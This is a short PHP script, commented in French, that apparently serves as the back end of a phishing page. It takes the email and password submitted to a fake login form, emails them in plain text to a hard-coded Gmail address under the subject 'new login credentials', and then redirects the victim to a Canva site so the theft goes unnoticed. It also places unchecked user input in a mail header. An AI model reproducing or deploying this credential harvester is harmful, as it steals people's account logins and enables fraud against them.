<?php
// Activer l'affichage des erreurs
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Sécuriser les données reçues
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    // Configurer les détails de l'e-mail
    $to = "dreamweeaar@gmail.com"; // Remplacez par votre adresse email
    $subject = "Nouveaux identifiants de connexion";
    $body = "Vous avez reçu de nouveaux identifiants de connexion.\n\n".
            "Email: $email\n".
            "Mot de passe: $password";
    $headers = "From: $email";

    // Envoyer l'e-mail
    if (mail($to, $subject, $body, $headers)) {
        // Rediriger l'utilisateur vers une autre page après l'envoi du formulaire
        header("Location: https://dreamwear.my.canva.site");
        exit(); // Assurez-vous que le script s'arrête après la redirection
    } else {
        echo "Désolé, quelque chose a mal tourné. Veuillez réessayer.";
    }
} else {
    echo "Méthode de requête non supportée.";
}
?>
